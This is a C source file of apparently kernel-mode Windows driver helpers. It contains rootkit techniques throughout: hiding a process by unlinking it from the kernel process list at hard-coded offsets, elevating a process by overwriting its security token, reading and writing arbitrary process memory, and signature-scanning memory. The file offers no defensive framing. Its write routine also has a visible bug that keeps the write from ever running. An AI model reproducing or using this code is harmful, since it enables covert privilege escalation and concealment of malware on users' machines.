#include "helpers.h"

PLIST_ENTRY HlpHideProcess(PEPROCESS HideProc)
{
	PLIST_ENTRY prev, list, next;
	if (HideProc == 0) return 0;
	list = (PLIST_ENTRY)((PUCHAR)HideProc + 0x0b8);
	prev = list->Blink; next = list->Flink;
	prev->Flink = next; next->Blink = prev;

	return list;
}

void HlpRestoreProcess(PLIST_ENTRY list)
{
	PLIST_ENTRY prev, next;
	if (list == 0) return;
	prev = list->Blink; next = list->Flink;
	prev->Flink = list; next->Blink = list;
}

HLPPROCTOKEN HlpGetCurrProcToken()
{
	PEPROCESS proc = IoGetCurrentProcess();
	HLPPROCTOKEN token; token.lo = 0; token.hi = 0;
	RtlCopyMemory(&token, (PUCHAR)proc+0x0f8, sizeof(HLPPROCTOKEN));
	token.lo &= 0xFFFFFFF0;
	return token;
}

HLPPROCTOKEN HlpElevateProcess(PEPROCESS proc, HLPPROCTOKEN *elvTo)
{
	PLIST_ENTRY prev, list, next;
	HLPPROCTOKEN oldToken; oldToken.lo = 0; oldToken.hi = 0;
	if (proc == 0) return oldToken;

	RtlCopyMemory(&oldToken, (PUCHAR)proc+0x0f8, sizeof(HLPPROCTOKEN));
	oldToken.lo &= 0xFFFFFFF0;
	RtlCopyMemory((PUCHAR)proc+0x0f8, elvTo, sizeof(HLPPROCTOKEN));

	return oldToken;
}

LONG HlpReadMemory(PEPROCESS proc, ULONG addr, PVOID dest, ULONG sz)
{
	LONG status = STATUS_UNSUCCESSFUL;
	UCHAR *buffer = (UCHAR*)ExAllocatePool(NonPagedPool, sz);

	if (buffer)
	{
		//read memory from process
		KAPC_STATE ApcState;
		KeStackAttachProcess(proc, &ApcState);
		__try { memcpy(buffer, (PVOID)addr, sz); status = STATUS_SUCCESS; }
		__except(EXCEPTION_EXECUTE_HANDLER) { status = STATUS_UNSUCCESSFUL; }
		KeUnstackDetachProcess(&ApcState);
		//copy to output if successful
		if (NT_SUCCESS(status))
		{
			__try { memcpy(dest, buffer, sz); }
			__except(EXCEPTION_EXECUTE_HANDLER) { status = STATUS_UNSUCCESSFUL; }
		}
		//free buffer
		ExFreePool(buffer);
	}

	return status;
}

LONG HlpWriteMemory(PEPROCESS proc, ULONG addr, PVOID src, ULONG sz)
{
	LONG status = STATUS_UNSUCCESSFUL;
	UCHAR *buffer = (UCHAR*)ExAllocatePool(NonPagedPool, sz);

	if (buffer)
	{
		//copy
		__try { memcpy(buffer, src, sz); }
		__except(EXCEPTION_EXECUTE_HANDLER) { status = STATUS_UNSUCCESSFUL; }
		if (NT_SUCCESS(status))
		{
			//write memory to process
			KAPC_STATE ApcState;
			KeStackAttachProcess(proc, &ApcState);
			__try { memcpy((PVOID)addr, buffer, sz); status = STATUS_SUCCESS; }
			__except(EXCEPTION_EXECUTE_HANDLER) { status = STATUS_UNSUCCESSFUL; }
			KeUnstackDetachProcess(&ApcState);
		}
		//free buffer
		ExFreePool(buffer);
	}

	return status;
}

ULONG _DataCompare(UCHAR *data, UCHAR *sig, ULONG siglen)
{
	ULONG i = 0;
	for(; i < siglen; i++)
		if ((sig[i] != '?') && (sig[i] != data[i]))
			return 0;
	return (i == siglen);
}
ULONG _FindPattern(ULONG addr, ULONG len, UCHAR *sig, ULONG siglen)
{
	ULONG i = 0;
	for (; i < len; i++)
		if (_DataCompare((UCHAR*)(addr+i), sig, siglen))
			return addr + i;
	return 0;
}
ULONG HlpScanMemory(PEPROCESS proc, DrvSigScanData *scan)
{
	ULONG AddressFound = 0;
	KAPC_STATE ApcState;
	KeStackAttachProcess(proc, &ApcState);
	__try
	{
		ULONG find = _FindPattern(
			scan->dwStartAddress, scan->dwMaxScanLength,
			scan->bSignature, scan->dwSignatureLength);
		if (find != 0) AddressFound = find;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		AddressFound = 0;
	}
	KeUnstackDetachProcess(&ApcState);
	return AddressFound;
}